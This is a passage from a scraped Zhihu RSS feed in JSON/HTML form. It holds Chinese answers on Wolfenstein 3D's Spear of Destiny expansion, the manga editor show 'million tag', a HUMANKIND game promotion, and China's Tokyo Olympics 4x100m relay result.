src=\"https://pic3.zhimg.com/v2-c8fa93201bf91efe39e291dd24f5632b_720w.png?rss\" data-caption=\"第六章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-c8fa93201bf91efe39e291dd24f5632b\" data-watermark-src=\"v2-6a8ef392b784f30e847d79ba70543ba0\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>恭喜！</b></li>\n<li><b>将军咽下最后一口气，自由世界免于纳粹的恐怖化学战争的伤害。你回到盟军总部中，一枚荣誉勋章正等着你。</b></li>\n<li><b>盟军指挥官告诉你海尔汉默城堡附近的一些罪恶行径。一些关于灰白色皮肤的疯狂士兵的事情……</b></li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/v2-d970ddb33587b6512a2d0e2eeb924f7b_720w.png?rss\" data-caption=\"说不定这就是ID那帮人的梦想\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d970ddb33587b6512a2d0e2eeb924f7b\" data-watermark-src=\"v2-dd3c1d95f8b4c28ede8428ece086d3dc\" data-private-watermark-src=\"\"></p>\n<ul>\n<li>你做到了！</li>\n<li>你完成了德军总部的第六章！</li>\n<li>你真是最伟大的英雄之一！世界欢呼着你的名字！你和总统一起拍了照！人们用你的名字给他们的婴儿命名！你娶了一位电影明星！是的！你太酷了！</li>\n<li>剧终</li>\n</ul>\n<h2>·《德军总部3D：命运之矛 (Spear of Destiny)》</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-9333dc097d06e5f1cbf9b022a115dac8_720w.jpeg?rss\" data-caption=\"《命运之矛》的封面，但是比起《德军总部3D》，B. J.看起来更稚嫩，缺了不少硬汉气概\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"967\" data-watermark=\"original\" data-original-src=\"v2-9333dc097d06e5f1cbf9b022a115dac8\" data-watermark-src=\"v2-90d0c4b393293dcb3056ef3b988efd41\" data-private-watermark-src=\"\"></p>\n<p>由于《德军总部3D》取得了很大的成功，ID又在同年推出了资料片《命运之矛 (Spear of Destiny)》，沿用了正篇绝大多数的资源，添加了一些新的纹理，音乐，敌人和BOSS等，包含21个新关卡。两年后，两个任务包《Return to Danger》和《Ultimate Challenge》推出，各有21关，最终被整合到了《命运之矛》中。</p>\n<p>《命运之矛》是《德军总部3D》的前传，是的，《德军总部3D》里面已经有前传了，这里又是前传。我估计ID那帮人对仅在第三章就把希特勒打死很后悔，第六章紧紧和第一章衔接，中间插不进去，又把结局写完了，后面只能不停地搞前传。《命运之矛》的三个任务包的流程几乎一样，只是贴图、关卡设计和BOSS有所不同。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fb7423eb8d687b2e7c619e49b4f3e975_720w.jpeg?rss\" data-caption=\"《命运之矛》开场画面\" data-size=\"normal\" data-rawwidth=\"1360\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-fb7423eb8d687b2e7c619e49b4f3e975\" data-watermark-src=\"v2-d23838940e3e29baef0806398382d600\" data-private-watermark-src=\"\"></p>\n<h2>—《命运之矛 (Spear of Destiny)》</h2>\n<p>《命运之矛》同样也有说明手册，感兴趣的玩家可以点击<b><a href=\"http://link.zhihu.com/?target=http%3A//legacy.3drealms.com/tech/manuals/Spear%2520of%2520Destiny.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">下载</a></b>。手册中除了至今的故事（The Story So Far），前面还有“当阿道夫·希特勒掌权时……（As Adolf Hitler Rises to Power……）”的额外背景说明。</p>\n<p><b>当阿道夫·希特勒掌权时……（As Adolf Hitler Rises to Power……）</b></p>\n<ul>\n<li><i>伴随着冷钢灼铅（cold steel and hot lead）的力量，希特勒决定将自己的祖国塑造成荣耀的第三帝国——一个崭新的神圣帝国。年轻时，希特勒渴望成为牧师，但是现在他把目标定的高不可及。他把自己比作救世主弥赛亚，声称所说的都是上帝的旨意，他深深跌入了自己扭曲玄秘的思维陷阱中。这个疯子渴求二次降临（注：耶稣再临），这使他到处寻找基督教的传奇圣物。</i></li>\n<li><i>希特勒最想得到的圣器就是“命运之矛”，基督被挂在十字架上的时候用于刺破他肋旁的那把武器。根据传说，拥有这柄矛的人是不败的。几个世纪以来，普鲁士和德国的领袖带着这把矛战无不胜。但第一次世界大战之后，它被从德国带走，放到了凡尔赛宫博物馆的玻璃之下。希特勒决意将其取回，德国通过闪电（blitzkrieg）战袭击法国之后，这柄矛很快从凡尔赛宫中被带走，运到了德国的要塞中。</i></li>\n<li><i>由于握于勇士的手中，因基督的血成圣，这柄矛成了希特勒珍惜的宝贝。拿着它，希特勒坚信自己是不可战胜的。让上帝领导他的行动，一个疯子的确信，“一个梦游者的保证”，他向整个欧洲派出军队。没人能对抗闪电战的可怕力量，几百万人沦为希特勒军队的牺牲品。</i></li>\n</ul>\n<p><b>至今的故事（The Story So Far）</b></p>\n<ul>\n<li><i>你是威廉·J·布拉斯科维奇，又称B. J.，盟军间谍中的坏小子，专门执行终极行动。有传言说希特勒利用命运之矛后变得更加异乎寻常。希特勒的死亡部长，恐怖的沙布斯博士正利用这柄矛唤醒死人来实现他的科学狂想。</i></li>\n<li><i>在盟军总部中你和大多数人一样，都对这柄矛的力量是否有效而深深的怀疑，只把故事当成纳粹的宣传，对此不屑一顾。你的只相信铅弹（lead）的力量，那些迷信之言只是童话故事。然而，你意识到拿到命运之矛这件事更是将早已不平衡的阿道夫推向边缘！无论如何，你的命令都很明确：潜入纽伦堡（Nuremberg）的要塞中取得那柄矛。</i></li>\n</ul>\n<p><b>现在……</b></p>\n<ul>\n<li><i>你已到达敌军后方，纳粹堡垒下方很深的树丛之中。一处下水道引向堡垒最底层的地牢之中。上面就是巨大的堡垒了，其中就存放着可以控制人类命运的东西。几百名纳粹士兵和几千发子弹挡在你的路上！你悄悄地进入了满是苔藓的下水道。</i></li>\n<li><i>塔楼高处的里面突然射出一股非自然的荧光（恰如上面的开场画面），你不知是什么，而附近的守卫则完全没有注意到。感觉好像有种被监视着的感觉，你轻轻地往手枪中插入一个新弹匣，准备应对前面的状况。但是，这世上没什么能让你对前面的战斗做好万全准备，一场为了命运之矛的战斗！</i></li>\n</ul>\n<p>进入游戏后，你向后一张望就能看见外面的景色，第五、十、十六和十八关都是BOSS关卡。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-869be6c088a42b61de546ac2bdb0d0a3_720w.png?rss\" data-caption=\"第五关关底BOSS——Trans Grosse，格罗塞家族的又一名成员，和他的亲戚发色不同，但长得很像，盔甲有所不同\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-869be6c088a42b61de546ac2bdb0d0a3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5ef71f49bb96d9482f2dbce961c20023_720w.png?rss\" data-caption=\"第十关BOSS——Barnacle Wilhelm\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-5ef71f49bb96d9482f2dbce961c20023\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-29ba1611f18de65c3c9967faea2709b6_720w.png?rss\" data-caption=\"第十六关BOSS——Übermutant，变种人，除了四只手臂扔飞刀，胸口还有机枪\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-29ba1611f18de65c3c9967faea2709b6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-633c4e7ce06969966c6ff85f91321a56_720w.png?rss\" data-caption=\"第十八关BOSS——死亡骑士（Death Knight）\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-633c4e7ce06969966c6ff85f91321a56\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-cee30d77f2f9255ae6a2817fd005343e_720w.jpeg?rss\" data-caption=\"这就是最终的关键道具——命运之矛，在这里可以无缝接入下一关\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-cee30d77f2f9255ae6a2817fd005343e\" data-watermark-src=\"v2-70bad03069b05089cf5a66382024c8fa\" data-private-watermark-src=\"\"></p>\n<p>当我们击败死亡骑士的时候，就可以开门拿到命运之矛，原本以为这就结束了，但是出人意料的是当我们拿到命运之矛走出房间时，才发现外面的一切都改变了！我们被吸入了地狱般的场景中！此时，周围有无数的鬼魂，更有恐怖的最终BOSS——死亡天使，它准备看看你是否有资格获得命运之矛，将其击败后我们看到B. J.一手握着命运之矛，一手拿着枪管已经烧红的机枪，因为受伤过重倒了下去，然后才能看到结束画面。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-758e7fc32bc6896070cd8c170cef28a5_720w.jpeg?rss\" data-caption=\"大家当时刚打完BOSS，浑身都是胜利后的轻松，就等着看结局动画了，结果竟然看到这一幕，都被吓了一跳，我刚不是还在打纳粹吗？What the...\" data-size=\"normal\" data-rawwidth=\"1439\" data-rawheight=\"1079\" data-watermark=\"original\" data-original-src=\"v2-758e7fc32bc6896070cd8c170cef28a5\" data-watermark-src=\"v2-c9a14ed93247621545482bb7bc787ffa\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c57a9abc84587b2510d5548726da144f_720w.png?rss\" data-caption=\"《命运之矛》关底结束语，你回到了人间\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-c57a9abc84587b2510d5548726da144f\" data-watermark-src=\"v2-f87a79411091af36761ecc5f977a3b32\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><i>盟军在离冒着烟的纽伦堡要塞废墟不远处的一座遍布青草的小山上发现了你，你受伤的手里紧紧握住命运之矛。你在那一动不动，身上冒着一缕青烟，你身下的青草有被火烧过的迹象。</i></li>\n<li><i>在盟军医院中，你没告诉任何人你与死亡天使那可怕的最终一战，以免其它人认为你疯了。但是，在你的记忆之中你仍然承受着城堡里其它强大敌人给你留下的伤疤，黑暗、致命，仿佛就在眼前。所有的战斗都是为了保卫这件神圣的遗物，只是保证希特勒那扭曲的梦想延续下去。</i></li>\n<li><i>命运之矛已经没了，第三帝国将会崩塌。希望它再也不会崛起了。</i></li>\n</ul>\n<p><img src=\"https://pic1.zhimg.com/v2-d62e3f6822919e6ce1f61961f8ad74a7_720w.jpeg?rss\" data-caption=\"布拉斯科维奇先生，我们欠你一个很大的情，你很好的服务了你的国家。命运之矛已经没了，盟军终于能摧毁希特勒了……\" data-size=\"normal\" data-rawwidth=\"1201\" data-rawheight=\"899\" data-watermark=\"original\" data-original-src=\"v2-d62e3f6822919e6ce1f61961f8ad74a7\" data-watermark-src=\"v2-755e4b8ad23fa013fc1c07c6f5a5b303\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d6e83120ab0e32c515dcb975afe330ea_720w.jpeg?rss\" data-caption=\"但那就是另一个故事了……\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d6e83120ab0e32c515dcb975afe330ea\" data-watermark-src=\"v2-6b271f130f9f6675c437b2321123629a\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0b8ebc70f33f552ec99ee26db8a32eb8_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-0b8ebc70f33f552ec99ee26db8a32eb8\" data-watermark-src=\"v2-9ee5df3fd03769256f27087ae4c2dd43\" data-private-watermark-src=\"\"></p>\n<h2>—《重返危险（Return to Danger）》&amp;《终极挑战（Ultimate Challenge）》</h2>\n<p>这两个任务包要更难，受到的负面评价也比较多。里面有很多诡异的蓝色，连手枪都是蓝色的，而且有些关卡必须通过推墙才能找到钥匙过关，打破了完全不知道秘密存在也能过关的默契（秘密关卡除外）。如果你直接玩游戏，会发现除了地图安排等等不一样，关卡设置和头一个任务包都一样，甚至击败死亡天使之后出现的关底文字，之后的剧情图片都完完全全一样，我们几乎不用在乎两个补充包的剧情（也没法在乎），只体验关卡和不同的BOSS即可（我也不逐个贴出来了，俩任务包里居然连很多BOSS都是重复的）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7fb50351d4ea9abe68736286954eaf33_720w.jpeg?rss\" data-caption=\"只有在包装盒的背面有两个任务包的简要剧情介绍，纯粹写着玩的，右边终极挑战那个真的是瞎写的，完全跟游戏内文字矛盾，我都不太想翻译\" data-size=\"normal\" data-rawwidth=\"1621\" data-rawheight=\"976\" data-watermark=\"original\" data-original-src=\"v2-7fb50351d4ea9abe68736286954eaf33\" data-watermark-src=\"v2-c03513cdbf27f64f97ea27ed435faf36\" data-private-watermark-src=\"\"></p>\n<p><b>不能再来一次了！</b></p>\n<ul>\n<li><i>自从命运之矛被从敌人手中夺过来已经过去6个星期了，轴心国发动了一场成功的突击队袭击来夺回它！在血腥的战斗过后，他们侥幸逃脱，将其带到了纳粹秘密的斯堪的纳维亚（Scandinauian）基地，那是从峡湾坚固的岩石中挖出来的。据说这座堡垒是坚不可摧的！</i></li>\n<li><i>你的任务就是再次把它夺回来。</i></li>\n</ul>\n<p><b>核子恐惧！</b></p>\n<ul>\n<li><i>作为盟军的顶级特工，你将面临迄今为止最为严峻的挑战！希特勒从过去的错误中吸取了教训，他在柏林的国会大厦下面扩建了他的地下指挥掩体，因此他能把命运之矛放在自己旁边，并好好守卫着！</i></li>\n<li><i>希特勒召唤了神秘的黑暗势力，他能洞察未来，并从未来获得武器系统的计划书！</i></li>\n</ul>\n<p>唯一还值得一提的是，《终极挑战（Ultimate Challenge）》的最后一关，也就是面对死亡天使的那个关卡，地图风格是《DOOM》的，都能看到写着“U.A.C.”的箱子，因为那时候《DOOM》早已发售，我们居然完成了在《毁灭战士》中玩《德军总部》，在《德军总部》中玩《毁灭战士》的闭环。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6a0445c14f572c3a5aed48d5811b19d9_720w.jpeg?rss\" data-caption=\"结束\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-6a0445c14f572c3a5aed48d5811b19d9\" data-watermark-src=\"v2-6d6f82def53a6cc8a81422b6dc01f042\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bing-he-xi-jian-61?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">冰河洗剑</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/425097623/answer/2046791153?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/67141710?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《重返德军总部》？</a><br><a href=\"http://www.zhihu.com/question/336835965?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价游戏《德军总部：新血脉》？</a><br>\n","link":"http://www.zhihu.com/question/425097623/answer/2046791153?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价集英社的编辑X漫画家节目 million tag?","date":"2021-08-10 15:30:09","description":"\n<p>暂时没什么人写，我来自问自答一下吧。</p>\n<p>我觉得漫画的绘制过程是比较枯燥和耗费精力的过程，和编辑的洽谈也并不一定会那么有趣。所以搞这么个类似爆漫王的活动，我本来是不特别看好的。而且哪有说刚看个漫画开头，还没开始连载，就决定动画化了？这绝对是最速动画化了吧。所以我对这个综艺其实是有一丝怀疑态度的。</p>\n<p>实际上，这个活动1-6期的油管视频，各话的播放数分别是：第一话：31w；第二话：14w；第三话：43w；第四话：14w；第五话：9.3w；第6话目前：14w。参考，jump油管大概目前300个视频出头，100w以上播放数的13个、50-100w的视频21个、30-50w的视频20个、20-30w的视频24个、10-20w的视频40个，所以算是，马马虎虎吧；或者说，是个“实验性质”的节目。</p>\n<p>不过这个节目还是很有意思的，比如里面提到的水之呼吸名字的由来是编辑的决定；贺来和三浦的对谈；境界触发者短篇的情节拆解；等等等等，从这方面来说，这个节目还是有一些收获的。</p>\n<p>其中1，2期的奖励和2期的辅助，分别是：藤本树的电话，远藤达哉的信件，贺来友志的对谈；而电锯人，间谍过家家，地狱乐这三部漫画，都是将要动画化的作品，所以以jump+为主体的这个节目，明显也承担了部分这三部作品的宣传工作。因此个人推测，第三轮冠军的奖励，大概是怪兽八号的作者：松本直也的解惑，你两周一更，还是有时间搞这个的吧。</p>\n<p>主持人们不说了，樱小姐真可爱。（竟然这么多期节目都没换衣服，出乎我意料，记得我看投石台里面她几乎就没穿过相同的衣服。）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-be6bfbd55a9bf225229e97ec93df716c_720w.jpg?rss\" data-rawwidth=\"350\" data-rawheight=\"410\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be6bfbd55a9bf225229e97ec93df716c\" data-watermark-src=\"v2-776d4659084535d12bfd95db37117bef\" data-private-watermark-src=\"v2-57b58c9b7b3f9b5ee1278773dee8a470\"></p>\n<p>编辑x漫画家阵容，<b>林</b>不用说了，从前面藤本树贺来友志远藤达哉就可以看出来吧，这全是林做的编辑，也是jump+最能打的作品，他明显非常注重漫画家自身的“输入工作”，所以其他人都开始画了，他们组总是：先花一周看各种书籍，漫画，电影，等等，然后再动手，非常稳健。分镜对门开合的修改，对整个剧本的改善，都一语中的，林编辑真是强。搭档的漫画家是个很有意思的人，年龄是六组中最大的，画风我也相当喜欢，有种“魔性”。每轮的故事也都挺有意思，不过第三轮的那个战斗漫画，虽然挺乐呵类似间谍过家家，但真的距离“异能力战斗”差的好远啊...估计真的不擅长这类吧。我个人也是觉得这组是最稳的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-74752883d4b27eb6e9f0aa5c96b25341_720w.jpg?rss\" data-rawwidth=\"466\" data-rawheight=\"399\" data-size=\"normal\" data-caption=\"看藤x树 这三轮里面的女性设定和分镜，似乎都有黑发女性和这样的角度\" data-watermark=\"original\" data-original-src=\"v2-74752883d4b27eb6e9f0aa5c96b25341\" data-watermark-src=\"v2-0f228584323d6d536814a8bb4fcd7775\" data-private-watermark-src=\"v2-0794f656e6071c5020c083b05769f57e\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bef9d6e61e1c56900ee340ae971ac7f1_720w.jpg?rss\" data-rawwidth=\"521\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bef9d6e61e1c56900ee340ae971ac7f1\" data-watermark-src=\"v2-4ff1f29a72dcd70609333452e325e4d1\" data-private-watermark-src=\"v2-4c6fc22e6704cafdb747936cc402f2a4\"></p>\n<p><b>玉田</b>个人是觉得真不行...前两轮把小姑娘心理都有点搞崩了，不知道他到底再做些什么，心理起伏太大了。第一轮那个四格，看到第一页就能猜到最后一页。我记得第一轮的标准大概是“反转，震惊感”之类的，这作品怎么拿的出来嘛。第二轮心态完全就崩了，看画面就看的出来。第三轮虽然是她擅长的战斗漫画，但个人觉得那个作品拿前三可以，拿第一还有点牵强...和第一轮一样，这位漫画家对漫画角色的情感拿捏的不太行，情感变化的有些突兀...所以我认为这<b>肯定是有剧本的成分在里面</b>...</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a7647bdac4c4f0ea06e4d64f08541257_720w.jpg?rss\" data-rawwidth=\"523\" data-rawheight=\"741\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a7647bdac4c4f0ea06e4d64f08541257\" data-watermark-src=\"v2-89e224a08559c1812ae31c40dbe488e0\" data-private-watermark-src=\"v2-d6a4b458a5af8526ec9cd5fac5a66016\"></p>\n<p>对<b>冈本</b>没什么印象...可能是这组的漫画家点子太多了所以忽视了...但是每轮这组呈现出来的作品我都很满意，和林那组并列是我最喜欢的。第三轮的魔法少女回家，虽然故事和怪兽八号有些像，有的地方的分镜我觉得有点问题，但依旧是我最喜欢的作品，第二轮的CO2也不错。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-21f8c5d7fa1941e49decd21e361cbf47_720w.jpg?rss\" data-rawwidth=\"524\" data-rawheight=\"806\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-21f8c5d7fa1941e49decd21e361cbf47\" data-watermark-src=\"v2-55b517bb2be70eb102be76a0adcef906\" data-private-watermark-src=\"v2-0e43d48d0f6cfc46b1e7e3bd82e7c1ba\"></p>\n<p><b>李光良</b>这组，是唯一一组三轮排名前三的，搭档的是“性癖猫”。我认为这个编辑还是很有实力的，比如他对异能力战斗漫画的一些坚持：必须要有必杀技；不过性癖猫真的是个非常“坚持自我”的作者，从第一回的换装play，到第二回的摸胸，第三回的体液交换，她的每部作品都非常有自己个人的风格。不过似乎这组编辑和作者是相对最针锋相对互相争论的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7636be340733cb0b143585362b33c6ed_720w.jpg?rss\" data-rawwidth=\"528\" data-rawheight=\"751\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7636be340733cb0b143585362b33c6ed\" data-watermark-src=\"v2-87a03759b1e43da8a1dfad644776f515\" data-private-watermark-src=\"v2-a66c6306b1bae336b98457b6e3863f9b\"></p>\n<p><b>双女性</b>这组，关系应该是最融洽的，可能是两个人兴趣很相近吧。第二轮编辑帮忙找自己同学进行话剧社的取材这点，可以看出还是很尽职尽责的。其他没有什么特别想说的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6eba89de4d1e4d4c43aa837d1654decc_720w.jpg?rss\" data-rawwidth=\"525\" data-rawheight=\"736\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6eba89de4d1e4d4c43aa837d1654decc\" data-watermark-src=\"v2-4ee29ad42bac045723204d7fb5b6e993\" data-private-watermark-src=\"v2-ed6263f3c63c5654b796a1dfc42f6064\"></p>\n<p><b>浅井</b>这组，虽然我对浅井还是挺有怨念的...毕竟是马修的编辑，而且还各种破事...但是他的确还是做了些事情的...第一回看了大量的四格漫画总结了经验，第三回拆解了触发的那个迅的短篇，这些我觉得做的都不错。不过第一回的故事怎么说呢，感觉恐怖漫画应该是“细思恐极”的，而不是它那种呈现...第二回的故事不太行不说了...第三回应该说，他们组的漫画反倒是最符合“异能力战斗”的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-78431b945ad61975f1f4d624005db525_720w.jpg?rss\" data-rawwidth=\"509\" data-rawheight=\"724\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-78431b945ad61975f1f4d624005db525\" data-watermark-src=\"v2-1e7232f79a59266146909e27140ce343\" data-private-watermark-src=\"v2-4ac0b261588f609a3b1f28938f8aea07\"></p>\n<p>总之，这个节目我还是觉得挺有意思的，毕竟漫勉就挺有意思的，这应该是另一种展示漫画家与编辑日常生活的方式了。节目时长一期大概也就半个小时以内吧，不过实际上他们第2，3回漫画评比我记得是绘制时间是3周，剪出半个小时，应该还是富裕的。不过我个人还是对直接动画化的决定抱怀疑态度...这真的能行吗...</p>\n<p>大概就这样，溜了溜了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tan-shu-shu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">云吞花卷</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/478580523/answer/2050928315?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/34737252?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些极端不以画工见长的漫画/漫画家？</a><br><a href=\"http://www.zhihu.com/question/455724738?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">漫画以后是否会消失，想成为漫画家，很担心？</a><br>\n","link":"http://www.zhihu.com/question/478580523/answer/2050928315?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021年8月发售的策略游戏新作《HUMANKIND》（人类）？","date":"2021-08-10 11:30:08","description":"\n<p>大家好！</p>\n<p>首先感谢知乎团队的邀请入驻。还有八天，我们的游戏《人类（《HUMANKIND™）》就要上线了，今天为大家带来一个有趣的花絮视频~</p>\n<a href=\"https://www.zhihu.com/video/1408468815714263040\">《人类（HUMANKIND）》游戏规模</a><p>游戏中共有60种不同的历史文化，你可以把它们结合起来，创造一个与你一般的独特文明。我们进行了简单的计算，推断出这60种文化可以产生超过一百万种不同的最终组合……不过实际上，我们到现在都还没算出最终的数字，我们还提供了近乎无限的虚拟形象自定义选项，可以说是无穷无尽~</p>\n<p>所以说游戏的规模很大，但我们还想用更多的数字来告诉你游戏究竟有多大。 </p>\n<p>在《Humankind》中，你可以看到129种不同的单位，他们将在10种细致精美的生态群落中穿行。这些生态群落中栖息着45种不同的动物物种，它们将在荒野中漫游，而你最终也会在其中繁衍生息。而你借此获得的成就和历史声望时刻，将通过700幅独特插图中的一幅来彰显。 </p>\n<p>随着你不断壮大你的文明，在93种科技中不断发展，你将体验到13个半小时的声响效果，内有超过1300个声音文件。与此同时，Arnaud Roy的280首气势磅礴的曲目将不断穿插其中，总共520分钟的配乐，由63名独立音乐家和20名合唱团歌唱人倾情演绎。 </p>\n<p>你自定义的虚拟形象将随着你的文明而发展，你将能够从超过122件量身定制的服装中为他们选择着装，而这些虚拟形象会通过10000多条配音台词来在游戏中表达他们的赞成或反对意见。你在150个叙述性事件中所做的选择将进一步丰富你和你的文明，而你将与竞争对手显得愈发不同——尤其是在支持10名玩家的多人游戏中！ </p>\n<p>《Humankind》已可在PC和Stadia平台上<a href=\"http://link.zhihu.com/?target=https%3A//store.humankind.game/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">进行预购</a>。游戏现在还将从8月17日起登陆Microsoft Xbox Game Pass。我们迫不及待地想让你和我们一起玩游戏，分享你的经历。</p>\n<p>- Amplitude团队</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/amplitude-studios?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">AMPLITUDE STUDIOS</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/383497512/answer/2051296175?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/338744499?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">玩游戏真的可以提升人类的反应力吗？</a><br><a href=\"http://www.zhihu.com/question/312617475?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《人类：一败涂地》真的很好笑吗？</a><br>\n","link":"http://www.zhihu.com/question/383497512/answer/2051296175?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运田径男子 4 x 100 米接力决赛中国队夺得第 4，如何评价本场比赛？","date":"2021-08-06 14:33:35","description":"\n<p>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强全程力压牙买加守住优势——37秒79，追平国家纪录（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是决赛第四——甚至跑赢了牙买加！</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"最后一棒的交接，有点可惜了，本来可以更好的。吴的启动节奏啊……\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-cc12df8436067a80b7aa7c4bfaa1497b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1730\" data-rawheight=\"662\" data-watermark=\"watermark\" 